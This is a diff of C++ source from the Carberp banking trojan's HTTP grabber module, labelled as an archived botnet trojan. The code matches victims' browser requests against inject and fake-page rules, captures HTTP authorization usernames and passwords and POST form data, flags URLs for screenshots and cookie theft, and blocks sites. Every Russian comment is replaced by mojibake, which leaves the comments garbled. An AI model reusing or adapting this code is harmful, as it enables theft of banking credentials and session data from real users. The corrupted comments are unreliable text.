@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -21,15 +32,15 @@
 #include "..\common\debug.h"
 #include "..\common\registry.h"
 
-//Хэш последней HTTP-авторизации (ламерский способ для предотврашения дублирования отчетов).
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ).
 static DWORD lastHttpAuthorizationHash;
 
-//Данные о блокируемой URL.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL.
 static struct
 {
-  CRITICAL_SECTION cs;   //Крит. секция для доступа к переменным.
-  LPSTR urlMaskForBlock; //Маска URL, по которой будет заблокирован доступ (== HttpInject::HEADER.urlMask).
-  LPSTR blockOnUrl;      //Маска URL, из-за которой будет заблокирован инжект (== HttpInject::HEADER.blockOnUrl). 
+  CRITICAL_SECTION cs;   //пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  LPSTR urlMaskForBlock; //пїЅпїЅпїЅпїЅпїЅ URL, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (== HttpInject::HEADER.urlMask).
+  LPSTR blockOnUrl;      //пїЅпїЅпїЅпїЅпїЅ URL, пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (== HttpInject::HEADER.blockOnUrl). 
 }blockInjectInfo;
 
 void HttpGrabber::init(void)
@@ -55,7 +66,7 @@ LPSTR HttpGrabber::_genarateMirrorFakeUrlA(const LPSTR fakeUrl, const LPSTR orig
   
   if(urlMaskSize > 0 && originalUrlSize > 0 && fakeUrlSize > 0)
   {
-    //Ишим конец дейтсвия маски без учета последнего компанента пути URL.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ URL.
     LPSTR start = urlMask + urlMaskSize;
     while(start > urlMask && *start != '/')start--;
     if(start > urlMask)
@@ -163,15 +174,15 @@ bool HttpGrabber::_addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localCon
   DWORD itemListSize;
   LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(*localConfig, listId, BinStorage::ITEMF_IS_SETTING, &itemListSize);
 
-  //Если элемент существует, ищим клон.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(Str::_isValidMultiStringA(itemList, itemListSize))
   {
-    //Ищим элемент в списке.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     LPSTR curItem = itemList;
     int urlMaskLen = Str::_LengthA(urlMask);
     while(Str::_CompareA(urlMask, curItem, urlMaskLen, -1) != 0 && (curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
 
-    //Клон не найден.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     if(curItem != NULL)
     {
 #     if defined WDEBUG0
@@ -186,7 +197,7 @@ bool HttpGrabber::_addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localCon
       ok = BinStorage::_modifyItemById(localConfig, listId, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, itemList, itemListSize);
     }
   }
-  //Если элемент поврежден или отсутвует, подменяем на новый.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   else
   {
     LPSTR newItem;
@@ -210,14 +221,14 @@ bool HttpGrabber::_removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **loc
   DWORD itemListSize;
   LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(*localConfig, listId, BinStorage::ITEMF_IS_SETTING, &itemListSize);
 
-  //Проверяем правильность списка.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   if(Str::_isValidMultiStringA(itemList, itemListSize))
   {
-    //Создаем копию списка для копирования в него, элементов не попавших под маску.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     LPSTR newItemList = (LPSTR)Mem::alloc(itemListSize);
     if(newItemList != NULL)  
     {
-      //Ишим элементы.
+      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       LPSTR curItem = itemList;
       LPSTR offset  = newItemList;
       int len;
@@ -233,14 +244,14 @@ bool HttpGrabber::_removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **loc
         {
           Str::_CopyA(offset, curItem, len);
           offset += len + 1;
-          *offset = 0; //Завершающий байт мульти-строки.
+          *offset = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
         }
       }
       while((curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
 
       if(ok == true)
       {
-        if(offset == newItemList)offset--; //Почти аналог BinStorage::ITEMF_COMBINE_DELETE.
+        if(offset == newItemList)offset--; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BinStorage::ITEMF_COMBINE_DELETE.
         ok = BinStorage::_modifyItemById(localConfig, listId, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItemList, offset - newItemList + 1);
       }
       Mem::free(newItemList);
@@ -271,12 +282,12 @@ bool HttpGrabber::_isUrlInList(DWORD listId, const BinStorage::STORAGE *localCon
 }
 
 /*
-  Проверка запроса на необходимость инждекта.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT requestData - запрос.
+  IN OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return             - true - инжекты применины,
-                       false - инжекты не применены
+  Return             - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                       false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 */
 static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 {
@@ -297,13 +308,13 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 
     while(HttpInject::_isCorrectHeader(curInject))
     {
-      LPSTR p          = (LPSTR)curInject; //Переменная для легокого доступа к строкам.
+      LPSTR p          = (LPSTR)curInject; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       LPSTR urlMask    = p + curInject->urlMask;
       DWORD matchFlags = curInject->flags &  HttpInject::FLAG_URL_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;
       
       if((curInject->flags & knownFlags) == knownFlags && HttpGrabber::_matchUrlA(urlMask, requestData->url, requestData->urlSize, matchFlags))
       {
-        //Проверяем по блеклисту.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if(requestData->localConfig != NULL && HttpGrabber::_isUrlInList(LocalConfig::ITEM_URLLIST_BLOCKEDINJECTS, requestData->localConfig, requestData->url, requestData->urlSize, matchFlags))
         {
 #         if defined WDEBUG1
@@ -312,7 +323,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
           goto SKIP_ITEM;
         }
 
-        //Проверяем пост-данные.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
         if(curInject->postDataBlackMask > 0 && HttpGrabber::_matchPostDataA(p + curInject->postDataBlackMask, (LPSTR)requestData->postData, requestData->postDataSize) == true)
         {
           goto SKIP_ITEM;
@@ -322,7 +333,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
           goto SKIP_ITEM;
         }
 
-        //Проверяем суточные ограничения.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if(curInject->flags & HttpInject::FLAG_ONCE_PER_DAY && curInject->blockOnUrl > 0)
         {
           SYSTEMTIME lastTime;
@@ -332,7 +343,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 
           Core::getRegistryValue(Core::RV_LOCALCONFIG, key, value);
 
-          //Получаем хэш.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
           {
             LPSTR blockUrl = p + curInject->blockOnUrl;
             BYTE hash[MD5HASH_SIZE];
@@ -340,7 +351,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
             Str::_toHexW(hash, MD5HASH_SIZE, value);
           }
           
-          //Проверяем значение.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           if(Registry::_getValueAsBinary(HKEY_CURRENT_USER, key, value, NULL, &lastTime, sizeof(SYSTEMTIME)) == sizeof(SYSTEMTIME))
           {
             SYSTEMTIME curTime;
@@ -355,7 +366,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
           }
         }
 
-        //Все хорошо, собираем данные.
+        //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
         {
           HttpGrabber::INJECTFULLDATA ifd;
 #         if defined WDEBUG2
@@ -369,10 +380,10 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
           ifd.blockOnUrl  = curInject->blockOnUrl == 0  ? NULL : Str::_CopyExA(p + curInject->blockOnUrl,  -1);
           ifd.contextMask = curInject->contextMask == 0 ? NULL : Str::_CopyExA(p + curInject->contextMask, -1);
          
-          //Фейк.
+          //пїЅпїЅпїЅпїЅ.
           if(curInject->flags & (HttpInject::FLAG_IS_FAKE | HttpInject::FLAG_IS_MIRRORFAKE))
           {
-            //Мульти фейки нельзя использовать, удаляем все инжекты.
+            //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             _freeInjectFullDataList(requestData->injects, requestData->injectsCount);
             requestData->injectsCount = 0;
 
@@ -381,7 +392,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 
             break;
           }
-          //Инжект.
+          //пїЅпїЅпїЅпїЅпїЅпїЅ.
           else if(curInject->flags & (HttpInject::FLAG_IS_INJECT | HttpInject::FLAG_IS_CAPTURE))
           {
             if((ifd.injects = (HttpInject::INJECTBLOCK *)BinStorage::_getItemDataEx(requestData->dynamicConfig, 1 + index, BinStorage::ITEMF_IS_HTTP_INJECT, &ifd.injectsSize)) != NULL &&
@@ -404,7 +415,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
               break;
             }
           }
-          //Неизвестно.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           else 
           {
             HttpGrabber::_freeInjectFullData(&ifd);
@@ -417,7 +428,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 SKIP_ITEM:;
       }
 
-      //Вычисляем следующий элемент.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       curInject = (HttpInject::HEADER *)(((LPBYTE)curInject) + curInject->size);
       if(((LPBYTE)curInject) + sizeof(HttpInject::HEADER) > endOfList || ((LPBYTE)curInject) + curInject->size > endOfList)break;
       index++;
@@ -429,12 +440,12 @@ SKIP_ITEM:;
 }
 
 /*
-  Замена POST-данных "application/x-www-form-urlencoded".
+  пїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ "application/x-www-form-urlencoded".
 
-  IN OUT requestData - запрос.
+  IN OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return             - true - данные заменены,
-                       false - данные не заменены.
+  Return             - true - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                       false - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
 {
@@ -457,14 +468,14 @@ static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
       LPSTR *varables;
       DWORD varablesCount;
 
-      //Получем список переменных.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if((varablesCount = Str::_splitToStringsA((LPSTR)requestData->postData, requestData->postDataSize, &varables, Str::STS_USE_SEPARATOR, '&')) != (DWORD)-1)
       {
         LPSTR *badVarables;
         DWORD badVarablesCount;
         curMask = Str::_multiStringGetIndexA(curMask, 1);
 
-        //Получаем список "плохих" переменных.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅпїЅпїЅ" пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if(curMask != NULL && (badVarablesCount = Str::_splitToStringsA(curMask, Str::_LengthA(curMask), &badVarables, Str::STS_USE_SEPARATOR, ';')) != (DWORD)-1)
         {
           LPSTR newPostData     = (LPSTR)Mem::alloc(requestData->postDataSize);
@@ -472,13 +483,13 @@ static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
 
           if(newPostData != NULL)
           {
-            //Ищим.
+            //пїЅпїЅпїЅпїЅ.
             for(DWORD i = 0; i < varablesCount; i++)if(varables[i] != NULL && varables[i][0] != 0)
             {
               bool skip = false;
               int len   = 0;
 
-              //Длина переменной.
+              //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
               while(varables[i][len] != '=' && varables[i][len] != 0)len++;
 
               for(DWORD j = 0; j < badVarablesCount; j++)if(badVarables[j] != NULL && badVarables[j][0] != 0 && HttpGrabber::_matchPostDataA(badVarables[j], varables[i], len))
@@ -487,7 +498,7 @@ static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
                 break;
               }
 
-              //Копируем переменную.
+              //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
               if(skip == false)
               {
                 if(newPostDataSize != 0)newPostData[newPostDataSize++] = '&';
@@ -498,12 +509,12 @@ static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
               }
             }
 
-            //Не чего не изменилось.
+            //пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             if(newPostDataSize == requestData->postDataSize)
             {
               Mem::free(newPostData);
             }
-            //Изменения есть.
+            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
             else
             {
               if(newPostDataSize == 0)
@@ -559,9 +570,9 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 #endif
 
   DWORD retVal = 0;
-  signed char writeReport = -1;/*-1 - по умолчанию, 0 - не писать, 1 - принудительно писать*/;
+  signed char writeReport = -1;/*-1 - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 0 - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, 1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ*/;
 
-  //Проверяем на блокировку.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   CWA(kernel32, EnterCriticalSection)(&blockInjectInfo.cs);
   if(blockInjectInfo.blockOnUrl != NULL && blockInjectInfo.urlMaskForBlock != NULL && _matchUrlA(blockInjectInfo.blockOnUrl, requestData->url, requestData->urlSize, 0))
   {
@@ -569,7 +580,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     WDEBUG1(WDDT_INFO, "Detected blocking url [%S] for current url.", blockInjectInfo.blockOnUrl);
 #   endif    
 
-    //Нельзя юзать requestData->localConfig т.к. она открта только для чтения.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ requestData->localConfig пїЅ.пїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     BinStorage::STORAGE *localConfig = LocalConfig::beginReadWrite();
     if(localConfig != NULL)
     {
@@ -591,7 +602,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
   }
   CWA(kernel32, LeaveCriticalSection)(&blockInjectInfo.cs);
   
-  //Проверяем запрос по фильтру.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(requestData->dynamicConfig != NULL)
   {
     DWORD httpFilterSize;
@@ -602,19 +613,19 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
       LPSTR curFilter = httpFilter;
       do if(curFilter[1] != 0)
       { 
-        //Опеределяем тип фильтра.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         char filterType;
         switch(curFilter[0])
         {
-          case '!': filterType = 1; break; //Не писать в отчет,
-          case '@': filterType = 2; break; //Скриншот.
-          case '-': filterType = 3; break; //Сохранение всех куков связаных с URL, и блокировка доступа.
-          case '^': filterType = 4; break; //Блокировка доступа.
-          default:  filterType = 0; break; //Принудительно писать в отчет.
+          case '!': filterType = 1; break; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ,
+          case '@': filterType = 2; break; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+          case '-': filterType = 3; break; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ URL, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+          case '^': filterType = 4; break; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+          default:  filterType = 0; break; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
         }
         if(filterType != 0)curFilter++;
 
-        //Сравниваем URL.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL.
         if(_matchUrlA(curFilter, requestData->url, requestData->urlSize, 0))
         {
 #         if defined WDEBUG3
@@ -655,7 +666,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
             case 3:
             {
               //FIXME: saveSessionCookies(requestData->url);
-              //НЕ НАДА ТУТ break!
+              //пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ break!
             }
             
             case 4:
@@ -666,7 +677,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
             }
           }
 
-          if(filterType != 2)break; //В случаи с скриншотом, продолжаем поиск.
+          if(filterType != 2)break; //пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
         }
       }
       while((curFilter = Str::_multiStringGetIndexA(curFilter, 1)));      
@@ -675,7 +686,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     Mem::free(httpFilter);
   }
 
-  //Если URL, пока не является заблакируемой. Пытаемся ее заблокировать.
+  //пїЅпїЅпїЅпїЅ URL, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if((retVal & HttpGrabber::ANALIZEFLAG_URL_BLOCKED) == 0 && requestData->localConfig != NULL)
   {
     if(_isUrlInList(LocalConfig::ITEM_URLLIST_BLOCKED, requestData->localConfig, requestData->url, requestData->urlSize, 0))
@@ -685,7 +696,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     }
   }
 
-  //Проверяем тип содержимого.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(requestData->contentTypeSize >= (CryptedStrings::len_httpgrabber_urlencoded - 1))
   {
     CSTR_GETA(formUrlEncoded, httpgrabber_urlencoded);
@@ -695,7 +706,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
        )retVal |= HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED;
   }
 
-  //Проверяем наличие HTTP-авторизации.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   LPWSTR authorizationData  = NULL;
   int authorizationDataSize = 0;
   if(requestData->authorizationData.userName != NULL && *requestData->authorizationData.userName != 0 && requestData->authorizationData.password != NULL && *requestData->authorizationData.password != 0)
@@ -709,7 +720,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     authorizationDataSize = Str::_sprintfExW(&authorizationData, format, requestData->authorizationData.unknownType);
   }
 
-  //Проверяем хэш  HTTP-авторизации.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ  HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(authorizationDataSize > 0)
   {
     DWORD hash = Crypt::crc32Hash(authorizationData, authorizationDataSize * sizeof(WCHAR));
@@ -725,7 +736,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     }
   }
 
-  //Опеределям нужно ли писать отчет.  
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.  
   {    
     if(writeReport == -1)
     {
@@ -734,13 +745,13 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     else if(writeReport == 1)retVal |= ANALIZEFLAG_SAVED_REPORT;
   }
   
-  //Пишим отчет
+  //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
   if(retVal & ANALIZEFLAG_SAVED_REPORT)
   {
     LPSTR postData = NULL;
     bool ok = false;
     
-    //Форматируем POST-запрос.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
     if(requestData->postDataSize == 0)
     {
       CSTR_GETA(decodedString, httpgrabber_report_empty);
@@ -763,7 +774,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
       postData = Str::_CopyExA(decodedString, CryptedStrings::len_httpgrabber_report_unknown - 1);
     }
   
-    //Формируем отчет.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     if(postData != NULL)
     {
       LPWSTR userInput;
@@ -780,7 +791,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 
         if(CWA(wininet, InternetCrackUrlA)(requestData->url, requestData->urlSize, 0, &uc) == TRUE)
         {
-          //Пишим.
+          //пїЅпїЅпїЅпїЅпїЅ.
           CSTR_GETW(reportFormat, httpgrabber_report_format);
           CSTR_GETW(reportBlocked, httpgrabber_report_blocked);
 		  char* buf = (char*)Mem::alloc(lstrlenA(postData) + 256);
@@ -816,7 +827,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
   
   Mem::free(authorizationData);
     
-  //Если URL оказалась заблокирована, применять следущие флаги нет смысла.
